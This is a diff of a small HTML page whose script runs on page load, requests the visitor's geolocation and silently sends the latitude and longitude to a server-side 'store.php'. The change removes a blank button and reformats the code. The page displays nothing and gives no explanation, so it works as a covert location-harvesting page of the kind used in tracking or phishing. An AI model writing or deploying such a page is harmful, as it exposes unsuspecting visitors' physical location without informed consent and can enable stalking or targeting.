@@ -7,28 +7,25 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <!--ssssssssssssssssssssssssttttttttttttttttttttttttttttttaaaaaaaaaaaaaaaaaaaaaaaaaaarrrrrrrrrrrttttttttttt-->
 <body onload="getLocation()">
+  <p id="demo"></p>
 
-<button onclick="getLocation()"></button>
+  <script>
+    var x = document.getElementById("demo");
 
-<p id="demo"></p>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else { 
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
 
-<script>
-var x = document.getElementById("demo");
-
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-function showPosition(position) {
- const xhttp = new XMLHttpRequest();
- xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
- xhttp.send();
-}
-</script>
-
+    function showPosition(position) {
+      const xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+      xhttp.send();
+    }
+  </script>
 </body>
 </html>
  <!--EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEENNNNNNNNNNNNNNNNDDDDDD-->
